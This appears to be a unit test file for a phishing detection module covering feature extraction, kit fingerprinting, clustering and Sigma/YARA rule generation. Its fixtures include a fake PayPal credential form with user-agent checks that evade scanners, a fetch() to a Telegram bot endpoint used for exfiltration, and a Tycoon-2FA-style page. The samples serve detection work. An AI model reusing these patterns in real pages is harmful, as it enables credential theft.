"""Unit tests for the P4 phishing module (no network)."""
from __future__ import annotations

import yaml

from app.modules.phishing.cluster import Item, cluster_items
from app.modules.phishing.detections import build_detections, url_regex
from app.modules.phishing.features import extract_features, feature_set, hamming, simhash
from app.modules.phishing.fingerprint import fingerprint, load_signatures

PAYPAL_HTML = """<html><head><title>Log in to your PayPal account</title>
<link rel="icon" href="/favicon.ico"><script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script></head>
<body><div class="login"><img src="/img/pp-logo.png"><form action="verify.php" method="post">
<input name="email" type="email"><input name="password" type="password"><button>Log In</button></form></div>
<script>var ua = navigator.userAgent; if (/urlscan|phishtank/i.test(ua)) location='https://paypal.com';
fetch('https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage');</script></body></html>"""
URL = "https://paypal-secure-verify.example.net/account/login.php"


def test_feature_extraction_on_fixture():
    f = extract_features(PAYPAL_HTML, URL)
    assert f["brand"] == "PayPal" and f["brand_confidence"] > 0.5
    assert f["has_password_field"] is True
    assert set(f["input_names"]) == {"email", "password"}
    assert "cdn.jsdelivr.net" in f["script_hosts"]
    assert "bot_blocklist" in f["antibot"] and "ua_check" in f["antibot"]
    assert any(e["type"] == "telegram_bot" for e in f["exfil"])
    assert "login" in f["path_markers"] and "php" in f["path_markers"]
    assert len(f["struct_hash"]) == 16 and f["tag_count"] > 5


def test_simhash_similarity_vs_difference():
    a = simhash(["div|0|1", "form|1|0", "input|2|0", "input|2|0", "button|2|1"])
    b = simhash(["div|0|1", "form|1|0", "input|2|0", "input|2|0", "button|2|1", "span|2|0"])
    c = simhash(["table|0|0", "tr|1|0", "td|2|0", "td|2|0", "a|3|0", "img|4|0", "p|1|2"])
    assert hamming(a, a) == 0
    assert hamming(a, b) < hamming(a, c)
    f1 = extract_features(PAYPAL_HTML, URL)
    f2 = extract_features(PAYPAL_HTML.replace("Log In", "Continue").replace("pp-logo", "pp-logo-2"), URL.replace("login", "signin"))
    assert hamming(int(f1["struct_hash"], 16), int(f2["struct_hash"], 16)) <= 4
    assert len(feature_set(f1) & feature_set(f2)) >= 5


def test_kit_signature_db_and_scoring():
    sigs = load_signatures()
    assert len(sigs) >= 12
    assert all(s.references for s in sigs)
    f = extract_features(PAYPAL_HTML, URL)
    kit = fingerprint(PAYPAL_HTML, URL, f)
    assert kit is not None and kit["slug"] == "generic-php-mailer"
    assert 0 < kit["confidence"] <= 0.98 and len(kit["hits"]) >= 3
    tycoon = "<html><script src='https://challenges.cloudflare.com/turnstile/v0/api.js'></script>" \
             "<body>Verifying you are human<script>eval(atob('x'))</script><a href='https://login.microsoftonline.com'>Sign in to your account</a></body></html>"
    kit2 = fingerprint(tycoon, "https://x.example/abcdefghijklmnopqrstuvwxyz12/", extract_features(tycoon, "https://x.example/abcdefghijklmnopqrstuvwxyz12/"))
    assert kit2 is not None and kit2["slug"] == "tycoon-2fa"
    # a bare kit-name substring inside an encoded blob must not fingerprint a page on its own
    blob = "<html><body><script>var d='aGVsbG8gov6wZXJsZA3ll';</script></body></html>"
    assert fingerprint(blob, "https://x.example/", extract_features(blob, "https://x.example/")) is None


def test_clustering_groups_identical_templates():
    f = extract_features(PAYPAL_HTML, URL)
    fs = feature_set(f)
    items = [Item(sample_id=i, struct_hash=int(f["struct_hash"], 16), brand="PayPal", fset=fs, features=f,
                  url=f"https://host{i}.example.net/account/login.php", apex=f"host{i}.example.net", ip=f"10.0.0.{i}",
                  asn="AS1", asn_name="TEST", country="US", tld="net") for i in range(4)]
    other_html = "<html><head><title>Chase Online</title></head><body><table><tr><td><form action='/x'><input name='userid'><input name='pin' type='password'></form></td></tr></table></body></html>"
    g = extract_features(other_html, "https://chase-login.example.org/")
    items.append(Item(sample_id=99, struct_hash=int(g["struct_hash"], 16), brand="Chase", fset=feature_set(g), features=g,
                      url="https://chase-login.example.org/", apex="example.org", ip=None, asn=None, asn_name=None, country=None, tld="org"))
    clusters = cluster_items(items)
    big = max(clusters, key=lambda c: len(c.members))
    assert len(big.members) == 4 and big.brand == "PayPal" and big.cohesion > 0.9
    assert any(c.method == "singleton" and c.brand == "Chase" for c in clusters)
    assert big.summary["takedown_targets"] and big.summary["shared_marker_groups"]["input_names"] == ["email", "password"]
    assert "input:email" in big.summary["shared_markers"] and all(isinstance(x, str) for x in big.summary["shared_markers"])
    assert all(isinstance(x, str) for x in big.summary["exfil_endpoints"])
    assert all({"type", "value", "count"} <= set(t) for t in big.summary["takedown_targets"])


def test_detection_generation_is_valid():
    f = extract_features(PAYPAL_HTML, URL)
    members = [{"url": f"https://host{i}.example.net/account/login.php", "domain": f"host{i}.example.net",
                "apex_domain": f"host{i}.example.net", "ip": f"10.0.0.{i}", "features": f} for i in range(3)]
    camp = {"name": "CAMP-2026-11-001", "brand": "PayPal", "sample_count": 3, "cohesion": 0.95, "kit_name": "Generic PHP mailer kit",
            "title_examples": [f["title"]]}
    dets = build_detections(camp, members, {"name": "Generic PHP mailer kit"})
    types = {d["type"] for d in dets}
    assert {"sigma", "yara", "url_regex", "ioc_domain", "ioc_ip", "ioc_url"} <= types
    for d in dets:
        if d["type"] == "sigma":
            doc = yaml.safe_load(d["content"])
            assert doc["logsource"] and doc["detection"]["condition"]
    y = next(d for d in dets if d["type"] == "yara")
    assert y["content"].startswith("rule phish_") and "condition:" in y["content"]
    rx = url_regex([m["url"] for m in members])
    import re
    assert re.match(rx, members[0]["url"])
